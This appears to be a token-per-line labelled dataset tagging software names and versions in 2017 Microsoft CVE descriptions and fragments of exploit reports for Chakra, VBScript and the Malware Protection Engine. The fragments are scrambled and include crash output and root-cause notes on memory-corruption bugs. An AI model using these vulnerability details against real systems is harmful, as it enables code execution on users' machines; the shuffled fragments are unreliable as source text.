reuseNestedFunc- O
> O
GetOriginalEntryPoint O
( O
) O
: O
nullptr O
) O
; O
if O
( O
this- O
> O
pCurrentFunction O
& O
& O
this- O
> O
pCurrentFunction- O
> O
IsFunctionParsed O
( O
) O
) O
{ O
Assert O
( O
this- O
> O
pCurrentFunction- O
> O
StartInDocument O
( O
) O
pnode- O
> O
ichMin O
) O
; O
here O
this- O
> O
pCurrentFunction O
is O
the O
consturctor O
, O
but O
pnode O
refers O
to O
the O
method O
f O
. O

Microsoft O
browsers O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

This O
issue O
can O
be O
reproduced O
steadly O
in O
uptodate O
Edge O
in O
Win10 O
WIP O
. O

chakra O
! O
utf8 O
: O
:EncodeIntoImpl O
< O
1 O
> O
+0xb5 O
: O
00007ffc`dbdb69e5 O
418910 O
mov O
dword O
ptr O
[ O
r8 O
] O
, O
edx O
ds:0000023d`22d81000 O

Assert O
( O
cbSource O
+ O
1 O
< O
= O
cbUtf8Buffer O
) O
; O
SRCINFO O
const O
pSrcInfo O
= O
scriptContext- O
> O
GetModuleSrcInfo O
( O
moduleID O
LEAVE_PINNED_SCOPE O
( O
) O
; O
} O
END_TRANSLATE_EXCEPTION_TO_HRESULT O
( O
hr O
) O
; O
END_LEAVE_SCRIPT_INTERNAL O
( O
scriptContext O
) O
; O
ifdef O
PROFILE_EXEC O
scriptContext- O
> O
ProfileEnd O
( O
Js O
: O
:EvalCompilePhase O
) O
; O
endif O
THROW_KNOWN_HRESULT_EXCEPTIONS O
( O
hr O
, O
scriptContext O
) O
; O
if O
( O
! O
SUCCEEDED O
( O
hrParser O
) O
) O
{ O
JavascriptError O
: O
:ThrowParserError O
( O
scriptContext O
, O
hrParser O
, O
& O
se O
) O
; O
} O
else O
if O
( O
! O
SUCCEEDED O
( O
hrCodeGen O
else O
ScriptFunction O
pfuncScript O
= O
funcBody- O
> O
IsCoroutine O
( O
) O

second O
chance O
! O
! O
! O
) O

ArenaAllocator O
tempArena O
( O
_u O
( O
EvalHelperArena O
) O
, O
scriptContext- O
> O
GetThreadContext O
( O
) O
- O
> O
GetPageAllocator O
( O
) O
, O
Js O
: O
:Throw O
: O
:OutOfMemory O
) O
; O
LPUTF8 O
utf8Source O
= O
AnewArray O
( O
& O
tempArena O
, O
utf8char_t O
, O
cbUtf8Buffer O
) O
; O
Allocate O
memory O
on O
Arena O
heap O
with O
a O
incorrect O
but O
smaller O
size O
Assert O
( O
cchSource O
< O
MAXLONG O
) O
; O
size_t O
cbSource O
= O
utf8 O
: O
:EncodeIntoAndNullTerminate O
( O
utf8Source O
, O
source O
, O
static_cast O
< O
charcount_t O
> O
( O
cchSource O
) O
) O
; O
OOB O
write O
HERE O
! O
! O
! O

dest O
+= O
4 O
; O
source O
+= O
4 O
; O
cch O
-= O
4 O
; O
} O
LSlowPath O
: O
if O
( O
cesu8Encoding O
else O
return O
dest O
- O
buffer O
; O
} O
Microsoft SN
( O
R SN
) O
Windows SN
Debugger SN
Version O
6.12.0002.633 SV
AMD64 O
Copyright O
( O
c O
) O
Microsoft O
Corporation O
. O

An O
exception O
will O
occur O
immediatly O
when O
opening O
POC.html O
in O
Edge O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

But O
the O
above O
code O
is O
using O
it O
regardless O
of O
buildAST O
. O

m_currentNodeFunc- O
> O
grfpn O
|= O
PNodeFlags O
: O
: O
fpnArguments_overriddenByDecl O
m_currentNodeFunc O
is O
only O
replaced O
when O
buildAST O
is O
true O
. O

Microsoft O
Edge O
Chakra O
- O
Uninitialized O
Arguments O
( O
1 O
) O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

Microsoft O
browsers O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8635 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

So O
if O
( O
argCount O
! O
= O
( O
Js O
: O
:ArgSlot O
) O
argCount O
) O
has O
no O
point O
. O

And O
argCount O
is O
of O
the O
type O
Js O
: O
:ArgSlot O
. O

void O
EmitNew O
( O
ParseNode O
pnode O
, O
ByteCodeGenerator O
byteCodeGenerator O
, O
FuncInfo O
funcInfo O
) O
{ O
Js O
: O
:ArgSlot O
argCount O
= O
pnode- O
> O
sxCall.argCount O
; O
argCount++ O
; O
include O
this O
BOOL O
fSideEffectArgs O
= O
FALSE O
; O
unsigned O
int O
tmpCount O
= O
CountArguments O
( O
pnode- O
> O
sxCall.pnodeArgs O
, O
& O
fSideEffectArgs O
) O
; O
Assert O
( O
argCount O
tmpCount O
) O
; O
if O
( O
argCount O
! O
= O
( O
Js O
: O
:ArgSlot O
) O
argCount O
) O
{ O
Js O
: O
:Throw O
: O
:OutOfMemory O
Js O
: O
:ArgSlot O
is O
a O
16 O
bit O
unsigned O
integer O
type O
. O

Microsoft O
browsers O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
JavaScript O
engines O
render O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8634 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

In O
the O
release O
build O
, O
propertyIndex O
remains O
uninitialized O
, O
this O
will O
cause O
a O
memory O
corruption O
. O

But O
if O
the O
method O
exits O
at O
( O
a O
) O
, O
descriptor- O
> O
Attributes O
will O
remain O
with O
PropertyDeleted O
set O
, O
and O
therefore O
we O
can O
call O
TryUndeleteProperty O
again O
and O
again O
until O
deletedPropertyIndex O
becames O
NoSlots O
which O
makes O
TryReuseDeletedPropertyIndex O
return O
false O
. O

In O
the O
debug O
build O
, O
the O
PoC O
hits O
the O
assertion O
Assert O
( O
reused O
) O
; O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8635 O
, O
CVE-2017-8636 O
, O
CVE-2017-8638 O
, O
CVE-2017-8639 O
, O
CVE-2017-8640 O
, O
CVE-2017-8641 O
, O
CVE-2017-8645 O
, O
CVE-2017-8646 O
, O
CVE-2017-8647 O
, O
CVE-2017-8655 O
, O
CVE-2017-8656 O
, O
CVE-2017-8657 O
, O
CVE-2017-8670 O
, O
CVE-2017-8671 O
, O
CVE-2017-8672 O
, O
and O
CVE-2017-8674 O
. O

In O
the O
first O
loop O
, O
aItem O
is O
an O
array O
, O
and O
firstPromotedItemIsSpreadable O
remains O
true O
because O
the O
condition O
for O
the O
fast O
path O
is O
satisfied O
. O

In O
the O
second O
loop O
, O
aItem O
is O
0x1234 O
and O
not O
spreadable O
, O
but O
the O
code O
at O
( O
a O
) O
makes O
the O
spreadable O
variable O
true O
, O
thus O
it O
reaches O
( O
b O
) O
and O
a O
type O
confusion O
occurs O
. O

A O
remote O
code O
execution O
vulnerability O
exists O
in O
Microsoft SN
Excel SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Excel SN
2013 SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2013 SV
RT SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2016 SV
, O
Microsoft SN
Office SN
Web SN
Apps SN
2013 SV
, O
Microsoft SN
Excel SN
for O
Mac O
2011 SV
, O
Microsoft SN
Excel SN
2016 SV
for O
Mac O
, O
and O
Microsoft SN
Office SN
Compatibility SN
Pack SN
Service SV
Pack SV
3 SV
, O
when O
they O
fail O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8630 O
, O
CVE-2017-8631 O
, O
and O
CVE-2017-8744 O
. O

A O
remote O
code O
execution O
vulnerability O
exists O
in O
Excel O
Services O
, O
Microsoft SN
Excel SN
2007 SV
Service SV
Pack SV
3 SV
, O
Microsoft SN
Excel SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Excel SN
2013 SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2013 SV
RT SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2016 SV
, O
Microsoft SN
Office SN
Web SN
Apps SN
2013 SV
, O
Microsoft SN
Office SN
Compatibility SN
Pack SN
Service SV
Pack SV
3 SV
, O
Microsoft SN
Excel SN
Web SN
App SN
2013 SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
Viewer SN
2007 SV
Service SV
Pack SV
3 SV
, O
and O
Office O
Online O
Server O
when O
they O
fail O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8630 O
, O
CVE-2017-8632 O
, O
and O
CVE-2017-8744 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8631 O
, O
CVE-2017-8632 O
, O
and O
CVE-2017-8744 O
. O

Microsoft SN
Office SN
2016 SV
allows O
a O
remote O
code O
execution O
vulnerability O
when O
it O
fails O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
CVE-2017-8618 O
, O
CVE-2017-9598 O
and O
CVE-2017-8609 O
. O

Microsoft O
Edge O
on O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
a O
remote O
code O
execution O
vulnerability O
in O
the O
way O
affected O
Microsoft O
scripting O
engines O
render O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
Internet O
Explorer O
in O
the O
way O
affected O
Microsoft O
scripting O
engines O
render O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
CVE-2017-8619 O
, O
CVE-2017-9598 O
and O
CVE-2017-8609 O
. O

On O
64-bit O
Windows SN
10 SV
in O
IE SN
Version O
11.1066.14393.0 SV
( O
Update O
version O
11.0.41 O
) O
I O
managed O
to O
set O
the O
result O
type O
to O
5 O
( O
Double O
) O
which O
causes O
a O
heap O
pointer O
leak O
( O
see O
the O
attached O
screenshots O
) O
as O
the O
pointer O
inside O
v1 O
will O
be O
treated O
as O
a O
double O
value O
. O

This O
issue O
is O
not O
limited O
to O
VbsVarMod O
and O
affects O
other O
arithmetic O
functions O
that O
call O
PvarGetArithVal O
and O
use O
a O
result O
lookup O
table O
as O
well O
( O
specifically O
: O
VbsVarAdd O
, O
VbsVarSub O
, O
VbsVarMul O
, O
VbsVarDiv O
, O
VbsVarIDiv O
, O
VbsVarPow O
) O
to O
a O
varying O
degree O
of O
exploitability O
( O
depending O
on O
how O
aggressive O
checks O
on O
the O
result O
type O
they O
make O
) O
. O

If O
we O
change O
v1 O
to O
an O
array O
( O
which O
typically O
has O
vartype O
of O
8192 O
) O
, O
suddenly O
there O
will O
be O
an O
out-of-bound O
access O
when O
looking O
up O
the O
result O
type O
and O
the O
result O
type O
can O
become O
unexpected O
. O

There O
might O
also O
be O
a O
possibilty O
to O
use O
invalid O
return O
type O
values O
> O
=18 O
as O
a O
trampoline O
, O
i.e O
. O

This O
causes O
a O
type O
confusion O
in O
v1 O
. O

However O
, O
if O
an O
attacker O
was O
lucky O
and O
managed O
to O
select O
as O
result_type O
something O
that O
contains O
a O
pointer O
( O
Such O
as O
a O
String O
or O
an O
Object O
) O
this O
could O
result O
in O
a O
type O
confusion O
with O
a O
more O
serious O
impact O
( O
a O
larger O
info O
leak O
in O
case O
of O
a O
String O
and O
possibly O
RCE O
in O
case O
of O
an O
Object O
) O
. O

One O
way O
to O
fix O
this O
in O
the O
affected O
functions O
is O
to O
do O
a O
check O
for O
vartype O
< O
18 O
only O
after O
both O
variables O
have O
been O
read O
. O

In O
case O
of O
VbsVarMod O
( O
) O
if O
the O
result O
type O
is O
not O
10 O
( O
Error O
) O
,2 O
( O
Integer O
) O
,3 O
( O
Long O
) O
or O
4 O
( O
single O
) O
, O
the O
function O
will O
simply O
assign O
the O
result O
type O
to O
the O
result O
variable O
( O
v1 O
) O
, O
while O
the O
actual O
data O
will O
remain O
unchanged O
. O

The O
problem O
is O
that O
the O
call O
to O
v2- O
> O
PvarGetArithVal O
( O
) O
can O
run O
arbitrary O
script O
which O
can O
change O
the O
type O
of O
arith_v1 O
. O

Which O
result O
type O
an O
attacker O
can O
select O
depends O
on O
the O
build O
of O
vbscript.dll O
. O

Microsoft SN
Internet SN
Explorer SN
11.1066.14393.0 SV
- O
VBScript O
Arithmetic O
Functions O
Type O
Confusion O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8598 O
, O
CVE-2017-8596 O
, O
CVE-2017-8595 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engine O
fails O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
Edge O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8595 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

Microsoft O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engine O
fails O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
Internet O
Explorer O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8598 O
, O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8595 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
and O
CVE-2017-8609 O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
Server SV
2008 SV
and SV
R2 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engines O
fail O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
browsers O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
7 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 O
Gold O
, O
1511 O
, O
1607 O
, O
and O
1703 O
, O
and O
Windows O
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engines O
fail O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
browsers O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8598 O
, O
CVE-2017-8596 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8595 O
, O
CVE-2017-8606 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8598 O
, O
CVE-2017-8596 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8595 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engine O
fails O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
Edge O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8601 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8598 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8601 O
, O
CVE-2017-8610 O
, O
CVE-2017-8603 O
, O
CVE-2017-8598 O
, O
CVE-2017-8601 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engine O
fails O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
Edge O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8598 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8595 O
, O
CVE-2017-8601 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8610 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
CVE-2017-8598 O
and O
CVE-2017-8609 O
. O

This O
time O
, O
func O
( O
a O
, O
b O
, O
i O
) O
; O
is O
replaced O
with O
func O
( O
a O
, O
b O

But O
it O
seems O
they O
fixed O
it O
incorrectly O
again O
. O

Tested O
on O
Microsoft SN
Edge SN
40.15063.0.0 SV
( O
Insider O
Preview O
) O
. O

Microsoft SN
Edge SN
40.15063.0.0 SV
Chakra O
- O
Incorrect O
JIT O
Optimization O
with O
TypedArray O
Setter O
3 O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engine O
fails O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
Edge O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8598 O
, O
CVE-2017-8610 O
, O
CVE-2017-8595 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8596 O
, O
CVE-2017-8601 O
, O
CVE-2017-8618 O
, O
CVE-2017-8619 O
, O
CVE-2017-8610 O
, O
CVE-2017-8601 O
, O
CVE-2017-8603 O
, O
CVE-2017-8604 O
, O
CVE-2017-8605 O
, O
CVE-2017-8606 O
, O
CVE-2017-8607 O
, O
CVE-2017-8608 O
, O
and O
CVE-2017-8609 O
. O

The O
Microsoft O
Malware O
Protection O
Engine O
running O
on O
Microsoft O
Forefront O
and O
Microsoft O
Defender O
on O
32-bit O
versions O
of O
Microsoft SN
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
8.1 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
does O
not O
properly O
scan O
a O
specially O
crafted O
file O
leading O
to O
memory O
corruption O
. O

aka O
Microsoft O
Malware O
Protection O
Engine O
Remote O
Code O
Execution O
Vulnerability O
. O

db6625c8 O

( O
gdb O
) O
r O
Starting O
program O
: O
mpclient O
testcase.exe O
main O
( O
) O
: O
Scanning O
testcase.exe O
... O
EngineScanCallback O
( O
) O
: O
Scanning O
input O
Program O
received O
signal O
SIGSEGV O
, O
Segmentation O
fault O
. O

db6625d8 O

db662628 O

Defaulted O
to O
export O
symbols O
for O
mpengine.dll O
- O
0192e7f0 O
66ac184e O
00370000 O
00000008 O
0000cc5c O
ntdll O
! O
RtlAllocateHeap+0x23a O
( O
FPO O
: O
[ O
Non-Fpo O
] O
) O
WARNING O
: O
Stack O
unwind O
information O
not O
available O
. O

Then O
you O
can O
read O
and O
write O
arbitrary O
data O
to O
an O
arbitrary O
offset O
to O
the O
MutableByteStream O
object O
buffer O
. O

db662608 O

The O
testcases O
have O
been O
encrypted O
to O
prevent O
crashing O
your O
exchange O
server O
. O

This O
full O
system O
x86 O
emulator O
runs O
as O
SYSTEM O
, O
is O
unsandboxed O
, O
is O
enabled O
by O
default O
and O
remotely O
accessible O
to O
attackers O
. O

db6625f8 O

db662618 O

0xf6e98c08 O
in O

See O
attachment O
for O
MpApiCall O
( O
) O
implementation O
, O
and O
pre-compiled O
